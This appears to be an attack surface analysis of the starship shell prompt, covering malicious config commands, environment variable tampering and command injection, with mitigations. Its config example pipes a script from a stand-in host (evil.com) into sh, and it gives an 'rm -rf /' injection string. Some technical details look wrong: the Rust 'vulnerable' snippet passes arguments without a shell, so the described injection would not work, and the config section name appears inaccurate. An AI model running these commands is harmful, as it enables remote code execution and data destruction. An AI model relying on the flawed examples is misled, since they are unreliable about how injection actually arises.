# Attack Surface Analysis for starship/starship

## Attack Surface: [Malicious `starship.toml` (Command Execution)](./attack_surfaces/malicious__starship_toml___command_execution_.md)

*   **Description:**  Attackers modify the `starship.toml` configuration file to inject malicious shell commands.
*   **How Starship Contributes:**  `starship`'s `command` module and other modules that execute external commands provide a direct mechanism for arbitrary code execution if the configuration is compromised. The flexibility of the configuration system is a key factor.
*   **Example:**
    ```toml
    [command.malicious]
    command = "curl -s http://evil.com/x | sh"
    when = "true"
    ```
    This downloads and executes a script from a malicious server every time the prompt is rendered.
*   **Impact:**  Complete system compromise. Attacker gains user privileges, enabling data exfiltration, malware installation, persistence, and lateral movement.
*   **Risk Severity:**  Critical
*   **Mitigation Strategies:**
    *   **(Users):**
        *   **Source Control:** Store `starship.toml` in a secure, version-controlled repository (e.g., private Git). Review changes regularly.
        *   **Trusted Sources:** Only use configurations from trusted sources (official documentation, reputable community members). Never blindly copy from untrusted websites.
        *   **Least Privilege:** Avoid running your shell as root.
        *   **File Integrity Monitoring (FIM):** Use FIM tools to detect unauthorized changes to `starship.toml`.
        *   **Manual Review:** Carefully review `starship.toml` for suspicious commands before applying changes.
    *   **(Developers):**
        *   **Sandboxing (Ideal, but Difficult):** Explore sandboxing for executing external commands. This is complex but significantly reduces risk.
        *   **Configuration Validation:** Implement stricter validation of `starship.toml` to detect dangerous patterns (e.g., excessive `command` use, suspicious URLs). Provide warnings/errors.
        *   **"Safe Mode":** Consider a "safe mode" that disables the `command` module and other risky features.
        *   **Documentation:** Clearly document the security risks of the `command` module and provide secure configuration best practices.

## Attack Surface: [Environment Variable Manipulation (Indirect Command Execution/Information Disclosure)](./attack_surfaces/environment_variable_manipulation__indirect_command_executioninformation_disclosure_.md)

*   **Description:**  Attackers modify environment variables used by `starship` or by commands *called* by `starship` to influence behavior or leak information.
*   **How Starship Contributes:** `starship` reads and uses environment variables. While it sanitizes some, attackers might bypass protections or influence external commands called by `starship`.
*   **Example:**
    *   Setting `GIT_DIR` to a malicious path to make `starship`'s Git module interact with a fake repository, potentially leading to command execution via malicious hooks.
    *   Setting `PATH` to include a directory with malicious executables, hoping `starship` executes them instead of legitimate commands.
*   **Impact:**  Ranges from information disclosure (leaking environment variables) to indirect command execution (if environment variables influence external commands). Severity depends on the variables and commands.
*   **Risk Severity:**  High (potentially Critical if it leads to command execution)
*   **Mitigation Strategies:**
    *   **(Users):**
        *   **Secure Shell Startup:** Protect shell startup scripts (`.bashrc`, `.zshrc`, etc.) from unauthorized modification.
        *   **Environment Variable Auditing:** Periodically review environment variables (`printenv`) for suspicious settings.
        *   **Avoid Untrusted Shell Sessions:** Be cautious running `starship` where the environment might be tampered with.
    *   **(Developers):**
        *   **Environment Variable Sanitization:** Strengthen `starship`'s sanitization. Consider a whitelist approach, allowing only known-safe variables.
        *   **Secure Defaults:** Use secure default values for environment variables.
        *   **Avoid Blindly Trusting Environment:** Validate and sanitize environment variables before use.
        *   **Documentation:** Clearly document which environment variables `starship` uses and how.

## Attack Surface: [Vulnerabilities in External Commands (Command Injection)](./attack_surfaces/vulnerabilities_in_external_commands__command_injection_.md)

*   **Description:** `starship` modules using external commands (e.g., `git`, `kubectl`) are vulnerable to command injection if input isn't sanitized.
*   **How Starship Contributes:** `starship` wraps these commands. If a module doesn't escape/validate user input before passing it to an external command, attackers can inject code.
*   **Example:**
    A module displaying `ls` output on a user-provided directory, without sanitization:
    ```rust
    // Vulnerable (simplified)
    fn get_listing(path: &str) -> String {
        Command::new("ls").arg(path).output().unwrap().stdout
    }
    ```
    An attacker could use a path like `"; rm -rf /; #"` to execute commands.
*   **Impact:** Arbitrary code execution with user privileges. Severity depends on the command and vulnerability.
*   **Risk Severity:** High (potentially Critical)
*   **Mitigation Strategies:**
    *   **(Users):**
        *   **Keep System Tools Updated:** Regularly update system tools (including those used by `starship` modules).
        *   **Avoid Untrusted Custom Modules:** Be cautious about custom modules from untrusted sources.
    *   **(Developers):**
        *   **Input Sanitization:** *Thoroughly* sanitize and escape user input before passing it to external commands. Use appropriate escaping functions. *Never* concatenate strings to build commands.
        *   **Use System APIs:** Use system APIs or libraries instead of shelling out when possible.
        *   **Parameterization:** Use parameterized commands/APIs that separate the command from arguments.
        *   **Code Reviews:** Thoroughly review code interacting with external commands.

